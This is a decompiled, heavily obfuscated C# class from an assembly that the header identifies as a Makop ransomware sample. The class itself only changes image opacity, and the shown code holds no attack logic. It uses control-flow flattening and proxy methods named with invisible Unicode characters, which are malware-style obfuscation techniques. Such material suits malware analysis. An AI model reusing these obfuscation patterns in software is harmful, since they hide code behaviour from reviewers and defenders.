// Decompiled with JetBrains decompiler
// Type: ImageUtil
// Assembly: هx, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 374CAC08-464B-4E84-B463-5CFD524FF26C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-74995e87513e47357c351f37565a1422202dace38dc789308d72417b5797b93e.exe

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;

public static class ImageUtil
{
  private const int bytesPerPixel = 4;

  public static Image Opacity(Image originalImage, double opacity)
  {
    bool flag1 = (ImageUtil.\u202C‍⁯‏‌‌‪‬⁫‏‌‍‍‭⁫‎‌​‎‮​‌⁮‮‏⁯‏‭‏‭‫‮‬‌​‮‮‎‌⁪‮(originalImage) & PixelFormat.Indexed) == PixelFormat.Indexed;
label_1:
    int num1 = -184810667;
    Bitmap bitmap;
    BitmapData bitmapData;
    bool flag2;
    IntPtr num2;
    byte[] numArray;
    int length;
    int num3;
    int num4;
    Image image;
    while (true)
    {
      uint num5;
      switch ((num5 = (uint) (num1 ^ -164052355)) % 25U)
      {
        case 0:
          num3 = 0 + 1;
          num1 = -703976654;
          continue;
        case 1:
          num1 = (int) num5 * -1762295852 ^ -1888693696;
          continue;
        case 2:
          goto label_1;
        case 3:
          int num6;
          num1 = num6 = num4 >= numArray.Length ? -534181632 : (num6 = -1013441565);
          continue;
        case 4:
          ImageUtil.\u206D⁯⁫⁪​‌‬⁭⁪‍‪​⁯⁮⁭‍‮⁮‪‍⁮‌‬‮‭​‌⁭​‫​‪⁪⁬⁬‬​‫⁪⁬‮(bitmap, bitmapData);
          num1 = (int) num5 * -1709972533 ^ -1917309077;
          continue;
        case 5:
          image = originalImage;
          num1 = (int) num5 * -136888477 ^ -2088566059;
          continue;
        case 6:
          int num7 = !flag2 ? -1042757211 : (num7 = -302651166);
          num1 = num7 ^ (int) num5 * 2049642343;
          continue;
        case 7:
          ImageUtil.\u202D⁭⁪⁫‬‏‏‎⁭⁯⁯‮‬⁭‍​‏⁫‏⁭⁫‍⁯⁮‮‍⁮‮‭⁬​‭‪‭‎⁮‏‎⁭⁪‮(numArray, 0, num2, length);
          num1 = (int) num5 * -1439372820 ^ 642796931;
          continue;
        case 8:
          PixelFormat pixelFormat = PixelFormat.Format32bppArgb;
          Rectangle rectangle = new Rectangle(0, 0, ImageUtil.\u200F‍‬⁫‏‬⁪⁫‍‭⁫‌‮‮⁭‎‏⁪‪⁮‏⁫⁭‍‏⁭⁯‭⁯‪‫​‍⁬‎‮⁮‌‏⁪‮((Image) bitmap), ImageUtil.\u206E⁫⁯​⁯‪‮‫⁫‫​‫​​⁬‮‬‭⁫⁫⁪⁯‍⁬⁪⁪‬⁬‏‭‏⁪‮‭‎⁮‬⁬‏‮((Image) bitmap));
          bitmapData = ImageUtil.\u200E‭‪‪⁬⁯⁬⁮⁯⁫‌⁫‎‬⁯⁯‌⁮‏‌‎‍⁭‌⁫⁪‫​‭‏‎⁮⁭‮‍‮⁪‮‍‭‮(bitmap, rectangle, ImageLockMode.ReadWrite, pixelFormat);
          num1 = (int) num5 * -2066590874 ^ -776575154;
          continue;
        case 9:
          ImageUtil.\u202D‮‮‌‬‬‭⁯‌‏‍‫‪⁮‍‏​‌⁮‬⁬‌⁮⁬‭‌⁫‭‫‫‬‎‫​⁯‮⁮‌‌⁬‮(num2, numArray, 0, length);
          num1 = (int) num5 * -1308755999 ^ -362148809;
          continue;
        case 10:
          num1 = (int) num5 * -1922536606 ^ -550894776;
          continue;
        case 11:
          int num8 = flag1 ? -690027555 : (num8 = -648062230);
          num1 = num8 ^ (int) num5 * -31480737;
          continue;
        case 12:
          length = ImageUtil.\u200F‍‬⁫‏‬⁪⁫‍‭⁫‌‮‮⁭‎‏⁪‪⁮‏⁫⁭‍‏⁭⁯‭⁯‪‫​‍⁬‎‮⁮‌‏⁪‮((Image) bitmap) * ImageUtil.\u206E⁫⁯​⁯‪‮‫⁫‫​‫​​⁬‮‬‭⁫⁫⁪⁯‍⁬⁪⁪‬⁬‏‭‏⁪‮‭‎⁮‬⁬‏‮((Image) bitmap) * 4;
          numArray = new byte[length];
          num1 = (int) num5 * 1104788914 ^ 1182126087;
          continue;
        case 13:
          ++num3;
          numArray[num4 + num3] = (byte) ((double) numArray[num4 + num3] * opacity);
          num1 = (int) num5 * 750524788 ^ 1960347728;
          continue;
        case 14:
          ++num3;
          num1 = (int) num5 * -45146341 ^ 1053843302;
          continue;
        case 15:
          num1 = (int) num5 * -300901620 ^ 1883770144;
          continue;
        case 16:
          num4 = 0;
          num1 = (int) num5 * -807413691 ^ 258128700;
          continue;
        case 17:
          num1 = (int) num5 * -362021731 ^ 93378627;
          continue;
        case 18:
          num1 = -1093338321;
          continue;
        case 20:
          bitmap = (Bitmap) ImageUtil.\u206D‪⁮⁫‌‪‬⁫⁮‪‏‫⁮‮‏‪‍⁭‌⁬⁮‎‏⁪‭‏‏‬⁬⁯​⁫⁪‮​‮⁪‌‌‎‮(originalImage);
          num1 = -1017260101;
          continue;
        case 21:
          num2 = ImageUtil.\u202E‎​‎‮‬⁯⁬⁪‮⁬‬⁫‏‭⁮‫⁭‪‬⁫‏‫‍‪‌‭‬‪‎‬⁪⁬‪‌⁫⁫⁫‫‭‮(bitmapData);
          num1 = (int) num5 * 991533780 ^ -1285470552;
          continue;
        case 22:
          flag2 = numArray[num4 + 4 - 1] == (byte) 0;
          num1 = (int) num5 * -505845835 ^ -1971161628;
          continue;
        case 23:
          image = (Image) bitmap;
          num1 = (int) num5 * -826932285 ^ -99214352;
          continue;
        case 24:
          num4 += 4;
          num1 = -1755657306;
          continue;
        default:
          goto label_26;
      }
    }
label_26:
    return image;
  }

  static PixelFormat \u202C‍⁯‏‌‌‪‬⁫‏‌‍‍‭⁫‎‌​‎‮​‌⁮‮‏⁯‏‭‏‭‫‮‬‌​‮‮‎‌⁪‮([In] Image obj0) => obj0.PixelFormat;

  static object \u206D‪⁮⁫‌‪‬⁫⁮‪‏‫⁮‮‏‪‍⁭‌⁬⁮‎‏⁪‭‏‏‬⁬⁯​⁫⁪‮​‮⁪‌‌‎‮([In] Image obj0) => obj0.Clone();

  static int \u200F‍‬⁫‏‬⁪⁫‍‭⁫‌‮‮⁭‎‏⁪‪⁮‏⁫⁭‍‏⁭⁯‭⁯‪‫​‍⁬‎‮⁮‌‏⁪‮([In] Image obj0) => obj0.Width;

  static int \u206E⁫⁯​⁯‪‮‫⁫‫​‫​​⁬‮‬‭⁫⁫⁪⁯‍⁬⁪⁪‬⁬‏‭‏⁪‮‭‎⁮‬⁬‏‮([In] Image obj0) => obj0.Height;

  static BitmapData \u200E‭‪‪⁬⁯⁬⁮⁯⁫‌⁫‎‬⁯⁯‌⁮‏‌‎‍⁭‌⁫⁪‫​‭‏‎⁮⁭‮‍‮⁪‮‍‭‮(
    [In] Bitmap obj0,
    [In] Rectangle obj1,
    [In] ImageLockMode obj2,
    [In] PixelFormat obj3)
  {
    return obj0.LockBits(obj1, obj2, obj3);
  }

  static IntPtr \u202E‎​‎‮‬⁯⁬⁪‮⁬‬⁫‏‭⁮‫⁭‪‬⁫‏‫‍‪‌‭‬‪‎‬⁪⁬‪‌⁫⁫⁫‫‭‮([In] BitmapData obj0) => obj0.Scan0;

  static void \u202D‮‮‌‬‬‭⁯‌‏‍‫‪⁮‍‏​‌⁮‬⁬‌⁮⁬‭‌⁫‭‫‫‬‎‫​⁯‮⁮‌‌⁬‮(
    [In] IntPtr obj0,
    [In] byte[] obj1,
    [In] int obj2,
    [In] int obj3)
  {
    Marshal.Copy(obj0, obj1, obj2, obj3);
  }

  static void \u202D⁭⁪⁫‬‏‏‎⁭⁯⁯‮‬⁭‍​‏⁫‏⁭⁫‍⁯⁮‮‍⁮‮‭⁬​‭‪‭‎⁮‏‎⁭⁪‮(
    [In] byte[] obj0,
    [In] int obj1,
    [In] IntPtr obj2,
    [In] int obj3)
  {
    Marshal.Copy(obj0, obj1, obj2, obj3);
  }

  static void \u206D⁯⁫⁪​‌‬⁭⁪‍‪​⁯⁮⁭‍‮⁮‪‍⁮‌‬‮‭​‌⁭​‫​‪⁪⁬⁬‬​‫⁪⁬‮([In] Bitmap obj0, [In] BitmapData obj1) => obj0.UnlockBits(obj1);
}
